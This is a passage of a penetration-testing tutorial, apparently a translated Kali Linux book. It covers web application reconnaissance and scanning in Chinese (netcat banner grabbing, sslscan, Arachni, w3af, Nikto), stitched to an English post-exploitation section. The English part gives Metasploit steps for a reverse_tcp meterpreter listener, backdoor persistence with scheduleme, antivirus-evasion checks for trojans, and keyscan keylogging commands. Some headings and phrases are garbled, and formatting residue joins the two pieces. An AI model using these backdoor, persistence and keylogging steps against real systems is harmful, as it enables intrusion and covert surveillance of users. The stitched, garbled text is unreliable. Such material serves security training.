    你可以在 [`owasp.org/www-project-top-ten/`](https://owasp.org/www-project-top-ten/)
    上了解更多关于 2020 年十大 10 漏洞的信息。此外，OWASP 在全球设有本地分会，旨在提高对软件安全的意识。这些分会拥有安全成员，他们会讨论测试软件的新方法、进行培训、开发安全应用程序等。你只需要参加小组会议即可成为
    OWASP 分会的成员。你可以通过上述的 URL 访问 OWASP 网站，并点击“Chapters”（分会）链接来搜索你附近的本地 OWASP 组。


    # 测试 Web 应用程序


    Kali Linux 许多工具，只需点击即可测试 Web 应用程序，但工具的力量只有在你知道何时使用以及如何使用它时才能发挥出巨大的威力。测试 Web 应用程序的渗透测试方法与伦理黑客方法论的前三个阶段相同，即侦察（Reconnaissance）、扫描（Scanning）和利用（Exploitation）。某些情况下可能还会利用最后两个阶段，即维持访问（Maintaining
    Access）和报告（Reporting）。


    此外，在测试 Web 应用程序时，伦理黑客需要测试网站上的每一个 Web 页，而不仅仅是首页或登录页。如果你保护了网站的登录页，并不意味着你已经保护了整个
    Web 应用程序，你就可以结束测试过程了。如今，攻击者目标网站有多种动机。因此，在测试网站或 Web 应用程序时，你不应该遗漏任何细节。


    让我们来看看测试 Web 应用程序的步骤。


    ## 第 1 步：手动审查


    当你对目标系统运行端口扫描时，它可能会返回一个结果，显示 HTTP 运行在 `80` 端口。但这并不意味着网站也运行在 `80` 端口。你可以启动浏览器并导航到目标系统的
    `80` 端口，以检查它是否在该端口提供网站服务。这不仅适用于 `80` 端口，端口扫描还可能返回运行在 `80` 或 `443` 端口以外的多个 Web
    服务。确保你扫描了网站上的所有可用链接，因为它们可能包含有用信息。如果网站的访问控制机制提示你输入密码，请尝试多达 10 个密码，或者直接按 Escape
    键查看你是否可以直接绕过身份验证。打开每个 Web 页面的源代码，检查是否有开发人员留下的注释。这可能是一个耗时且无聊的过程，但世界上没有任何自动化工具可以识别所有的漏洞。因此，手动审查网站或
    Web 应用程序是一个关重要的第一步。


    ## 第 2 步：指纹识别


    对网站的手动审查无法提供 Web 服务器、Web 应用程序或操作系统的细节。使用 Kali Linux 进行指纹识别可以帮助确定这三者。


    ### NetCat (nc)


    NetCat 是 Kali Linux 中的一个工具，可以作为指纹工具，也可以作为传入连接的监听器。在 Kali Linux 终端中使用 `NetCat`
    命令的语法如下。


    ```

    nc {host} {port}

    ```

    示例：`nc 192.168.56.102 80`


    此命令将与 IP 为 `192.168.56.102` 的主机建立连接，但在命令发送到 Web 服务器之前，将不会返回任何结果。使用 `NetCat` 进行指纹识别有多种技术。你可以使用以下命令获取有关目标系统
    Web 服务器和操作系统的信息。


    ```

    nc 192.168.56.102 80

    HEAD / HTTP/1.0

    ```

    按两次 Enter 键。


    在我们示例的此命令结果中，目标系统在 Ubuntu Linux 操作系统上运行着 Apache 2.2，PHP 版本为 `5.2.4-2ubuntu5.10`。这些信息将帮助伦理黑客缩小想要针对目标系统使用的工具和攻击范围。


    ### SSLScan (sslscan)


    如果你看到一个网站正在使用 SSL 证书，了解该网站使用的 SSL 加密类型是好的。浏览器地址栏中网站 URL 之前的锁头图标是网站正在使用 SSL 证书的指示。


    ![](img/Image00006.jpg)


    `SSLScan` 工具查询服务器上的 TLSv1、SSLv2 和 SSLv3 服务，检查是否有任何首选加密算法，并返回网站正在使用的 SSL 证书。在 Kali
    Linux 终端中使用的 `sslscan` 命令如下。


    ```

    sslscan {ipaddress} {port}

    ```

    示例：`sslscan 192.168.56.102 80`


    ## 第 3 步：扫描


    自动化扫描将帮助减少扫描整个系统漏洞所需的时间。有多种应用程序可扫描 Web 服务器，一个优秀的伦理黑客不应该仅依赖单一应用程序。单一应用程序永远无法发现数千个安全缺陷并列出系统所有的漏洞。使用至少两个三个工具扫描
    Web 应用程序是一种良好的做法。Nessus、WebInspect 和 Retina 等扫描应用程序是行业领先的，但价格昂贵。Kali Linux 有一组内置的扫描工具可以用于扫描。


    让我们来看看其中。


    ### Arachni


    `Arachni` 工具是一个 Web 应用程序扫描器，像 Nessus 一样从图形用户界面运行。唯一的区别是，与 Nessus 不同，`Arachni`
    可以在特定时间对单个主机进行单独扫描。如果目标系统在多个端口上有多个 Web 服务，你需要每个新端口重复扫描。例如，如果 `http://helloworld.com`
    在 `80` 端口托管了 Web 服务，而 `phpMyAdmin` 运行在 `443` 端口 (HTTPS)，你必须对 `Arachni` 进行单独扫描。然而，`Arachni`
    扫描是高度自定义的。`Arachni` 有许多设置和插件允许特定的扫描。所有插件默认都启用。`Arachni` 还支持以所有文件格式导出报告。


    你可以如下如下在 Kali Linux 中启动 `Arachni` Web 扫描器：点击 Applications > Kali Linux > Web Applications
    > Vulnerability Scanners > `arachnid_web`


    ![](img/Image00007.jpg)


    这将启动终端窗口，指示 `Arachni` 服务正在启动。在 Kali Linux 中打开浏览器并导航到 [`127.0.0.1:4567`](http://127.0.0.1:4567)
    以访问 `Arachni` 界面，如下：


    ![](img/Image0008.jpg)


    要在目标系统上启动扫描，将主机 IP 输入文本框并点击 `Scan` 按钮。


    ![](img/Image0009.jpg)


    当扫描器运行时，过程将附加 `Dispatchers`。你可以同时运行多个调度器。如果你想对更多 Web 服务运行扫描，可以同时从 `Scan` 标签启动另一个扫描。当你正在进行扫描时，可以点击
    `Dispatchers` 标签。在所有扫描完成后，Arachni 会自动切换到 `Reports` 标签。伦理黑客可以从此标签以流行的文件格式导出报告。每个执行的扫描都有单独的报告。报告还提供条形图和饼图。


    ![](img/Image0010.jpg)(Image0011.jpg)


    `Arachni` 有两类报告：`Trusted` 和 `Untrusted`。`Trusted` 报告下的漏洞是准确的，因为应用程序在扫描期间没有收到 Web
    服务器的异常响应。`Untrusted` 报告下的漏洞可能是误报，需要手动审查。


    ### w3af


    `w3af` 是另一个 Kali Linux 免费轻量级扫描器。由 OWASP 安全社区开发。该工具的报告功能相对于 `Arachni` 有限，但仍可用 Web
    服务器漏洞扫描的良好入门工具。使用 `w3af` 最大的优势是它有多个插件可以从互联网下载。伦理黑客需要连接互联网才能使用 `w3af` 进行测试。如果没有互联网，此测试将产生很多错误，因为插件在测试扫描主机时会从互联网拉取脚本。


    你可以如下在 Kali Linux 中启动 `w3af` 应用程序：点击 Applications > Kali Linux > Web Applications
    > Vulnerability Scanners > `w3af`


    ![](img/Image0012.jpg)


    这将启动 `w3af` 图形界面，其有一个没有插件的空配置。你可以通过选择所需的插件并点击菜单栏上的 `Profiles` > `Save As` 创建新配置。你也可以使用提供的预定义配置。你可以点击如
    `OWASP_TOP10` 的配置并将其用于扫描。你可以对 `w3af` 可用的插件进行细粒度控制。也可以在启动扫描之前自定义预定义插件。但注意，在没有互联网连接的情况下执行扫描是一种尝试方法。在主选择窗口下还有另一个插件部分。这些插件可用于报告。所有生成的报告默认将保存到
    `/root/`。我们在扫描示例中选择了 `OWASP_TOP10` 配置。我们还为扫描关闭了发现插件选项，并激活了 HTML 报告。


    ![](img/Image0013.jpg)


    我们将输入目标系统进行扫描并点击 `start` 按钮。由于我们没有激活任何插件，扫描将返回有限的结果。如果你希望以 HTML 格式查看结果，只需启动浏览器并导航到
    `file:///root/report.html`。


    ### Nikto


    `Nikto` 是 Kali Linux 中提供的另一个简单扫描器，可用于扫描 Web 服务器和 Web 应用程序。再次，此工具允许你每次只扫描一个主机，但工具中的
    `output` 命令允许你跟踪每次扫描的摘要。你可以生成所有文件格式的报告，并将其作为 `Metasploit` 的输入。`Nikto` 发现的大多数漏洞引用了开源漏洞数据库
    (OSVDB)。


    # Webssploit 第章：维持访问


    ![](img/Image00003.jpg)


    维持访问是渗透测试周期的第四阶段。本章将带你了解利用后执行的操作，以维持对受攻击目标系统的访问。利用计算机系统或网络是很不起的，但伦理黑客的目标是找到一种在利用后维持对目标系统访问的方法。有多种方法维持被利用系统的访问，但它们都有共同的动机：减少在第一次尝试被攻破后继续攻击同一台机器所需的时间和精力。如果伦理黑客正在工作，第一次尝试后可能需要再次访问受攻击的系统。

    '
- fmt: '

    # Metasploit Usage Guide


    1. `Msfconsole`

    2. `Use exploit/multi/handler`

    3. `Set payload windows/meterpreter/reverse_tcp`

    4. `Set lhost {your_ip}`

    5. `Set lport {port}`

    6. `Run`


    When you have set up a Metasploit listener and start receiving calls from the
    backdoor on the target system, it is because the user executed the `unencoded-payload.exe`
    file.


    ## Persistent Backdoors


    You may remember that when you were in college, you would keep going back to your
    parent’s place at regular intervals to collect your clothes or request some financial
    aid. Similarly, a backdoor also keeps looking for more instructions from the ethical
    hacker at regular intervals.


    The `meterpreter` shell has the `scheduleme` option that can be used to achieve
    this. You can schedule commands to be launched at regular intervals using `scheduleme`.
    Alternatively, you can schedule commands to be launched based on user actions
    such as restarting the system or logging into the system.


    The command is as follows: `scheduleme -c {“file/command:} -i -l`.


    For example, you can create a schedule to launch the `unencoded-payload.exe` file
    when a user restarts the system. The command will be executed only once when the
    user restarts the system.


    ## Detectability


    If an ethical hacker is already aware of the antivirus system running on the target
    system, they can upload the Trojans or backdoors created by them on the following
    website to see which antivirus software in the world already have signatures to
    detect those Trojans and backdoors.


    ## Keyloggers


    Keylogging is a process through which the keystrokes of a user or system administrator
    are logged while they are using a system. There are several third party keylogging
    applications available, most of which brag about their ability to go undetected.


    While this is true, the installation of a keylogger on a system requires it to
    have some applications to attach a listening device physically to it. The third-party
    applications do not account for the virus scanners or intrusion detection systems
    on the target system while making their claims.


    There is an in-built tool in Metasploit known as the `keyscan`. If an ethical
    hacker has managed to establish a session with the target system, then the commands
    to use the `keyscan` tool are simple:


    1. `Keyscan_start`

    2. `Keyscan_dump`

    3. `Keyscan_dump` (repeat as necessary)

    4. `Keyscan_stop`

    '
